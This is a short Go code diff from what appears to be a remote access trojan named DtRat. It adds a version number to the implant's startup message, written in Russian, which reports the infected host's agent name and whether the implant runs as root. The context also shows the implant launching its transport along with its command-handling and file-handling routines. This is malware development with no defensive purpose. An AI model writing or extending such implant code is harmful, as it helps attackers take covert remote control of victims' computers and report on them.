@@ -1,5 +1,7 @@
 package rat
 
+import "dtrat/config"
+
 func (r *Rat) internalClose(reason error) {
 	if !r.isRunning.Swap(false) {
 		return
@@ -25,7 +27,7 @@ func (r *Rat) Start() {
 	r.Transport.Start()
 	go r.commandHandling()
 	go r.fileHandling()
-	r.Transport.Send("DtRat Запущен!\n\nХост: %s\nroot: %t", r.Config.General.AgentName, r.Engine.Info.IsRoot())
+	r.Transport.Send("DtRat %s Запущен!\n\nХост: %s\nroot: %t", config.Version, r.Config.General.AgentName, r.Engine.Info.IsRoot())
 }
 
 func (r *Rat) commandHandling() {
